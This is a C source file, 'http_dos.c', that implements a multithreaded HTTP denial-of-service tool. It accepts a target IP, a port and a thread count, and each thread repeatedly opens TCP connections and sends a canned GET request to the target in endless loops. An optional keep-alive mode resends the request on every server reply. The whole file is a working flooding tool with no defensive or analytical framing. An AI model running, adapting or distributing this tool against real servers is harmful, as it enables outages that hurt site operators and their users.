//      http_dos.c
//
//      Copyright 2011 Delin <delin@eridan.la>
//
//      This program is free software; you can redistribute it and/or modify
//      it under the terms of the GNU General Public License as published by
//      the Free Software Foundation; either version 2 of the License, or
//      (at your option) any later version.
//
//      This program is distributed in the hope that it will be useful,
//      but WITHOUT ANY WARRANTY; without even the implied warranty of
//      MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//      GNU General Public License for more details.
//
//      You should have received a copy of the GNU General Public License
//      along with this program; if not, write to the Free Software
//      Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
//      MA 02110-1301, USA.


#include <stdio.h>
#include <netdb.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <sys/resource.h>
#include <arpa/inet.h>


typedef unsigned long long ullong;
typedef unsigned long ulong;
typedef unsigned int uint;
typedef unsigned short ushort;
typedef unsigned char uchar;
typedef long long llong;


char http_hello[4096] = {0},
     http_mode = 0,
    *p_host = "127.0.0.1",
    *p_port = "80";

long sizeof_http;

// get sockaddr, IPv4 or IPv6:
extern void *get_in_addr(struct sockaddr *sa)
{
    return &(((struct sockaddr_in*)sa)->sin_addr);
}

void *thr_burn_http(void *argv)
{
    //~ unsigned long thread_id = (long)argv;

    ullong j;
    for (j = 0; ; j++) {
	struct addrinfo hints, *servinfo, *p;
	int rv, fd = 0;
	char s[15];

	//~ printf("[thread] Created #%ld.\n", thread_id);

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;

	if ((rv = getaddrinfo(p_host, p_port, &hints, &servinfo)) != 0) {
	    //~ fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
	    //~ perror("");
	    continue;
	}

	// loop through all the results and connect to the first we can
	for (p = servinfo; p != NULL; p = p->ai_next) {
	    if ((fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
		//~ printf("[error]: socket\n");
		continue;
	    } else if (connect(fd, p->ai_addr, p->ai_addrlen) == -1) {
		close(fd);
		//~ printf("[error]: connect\n");
		continue;
	    }

	    break;
	}

	if (p == NULL) {
	    //~ fprintf(stderr, "client: failed to connect\n");
	    return 0;
	}

	inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr), s, sizeof s);

	ullong i;
	for (i = 0; ; i++) {
	    if ((fd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
		//~ printf("[error]: socket\n");
		break;
	    } else if (connect(fd, p->ai_addr, p->ai_addrlen) == -1) {
		close(fd);
		//~ printf("[error]: connect\n");
		break;
	    }

	    write(fd, &http_hello, sizeof_http);

	    if (http_mode == 1) {
		void *buf;
		while (read(fd, &buf, sizeof(buf)))
		    write(fd, &http_hello, sizeof_http);
	    }

	    //~ printf("[thread][%ld]\tОтработали:\t%d\t%llu\t%llu\n", thread_id, fd, i, j);
	    close(fd);
	}

	freeaddrinfo(servinfo); 					// all done with this structure
    }

    return 0;
}

int print_usage()
{
    printf("-i [dst_ip]\n\
-p [dst_port]\n\
-c [count]\tCount of threads\n\
-k\t\tKeep alive mode\n\
-h\t\tHelp\n");

    return 0;
}

int main(int argc, char **argv)
{
    struct rusage* memory = malloc(sizeof(struct rusage));
    pthread_t *thread_burn;
    long i = 0, p_count = 1;

    if (argc > 1) {
	for (i = 1; i <= argc; i++) {
	    if (!argv[i])
		break;
	    else if (!strncmp("-i", argv[i], strlen(argv[i])))
		p_host = argv[i + 1];
	    else if (!strncmp("-p", argv[i], strlen(argv[i])))
		p_port = argv[i + 1];
	    else if (!strncmp("-c", argv[i], strlen(argv[i])))
		p_count = atoi(argv[i + 1]);
	    else if (!strncmp("-k", argv[i], strlen(argv[i])))
		http_mode = 1;
	    else if (!strncmp("-h", argv[i], strlen(argv[i]))) {
		print_usage();
		return 0;
	    }
	}
    }

    thread_burn = calloc(p_count, sizeof(pthread_t));

    sprintf(http_hello, "GET /\r\n\
Host: %s\r\n\
User-Agent: TestClient/0.1\r\n\
Content-Length: 42\r\n\
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n\
Accept-Language: cn;q=0.7\r\n\
Accept-Charset: cp866;q=0.7,*;q=0.7\r\n", p_host);

    sizeof_http = strlen(http_hello);

    for (i = 0; i < p_count; i++)
	pthread_create(&thread_burn[i], NULL, thr_burn_http, (void *)i);

    pthread_join(thread_burn[0], NULL);

    getrusage(RUSAGE_SELF, memory);
    printf("Mem usage: %ldkB\n", memory->ru_maxrss);

    perror("");

    return 0;
}
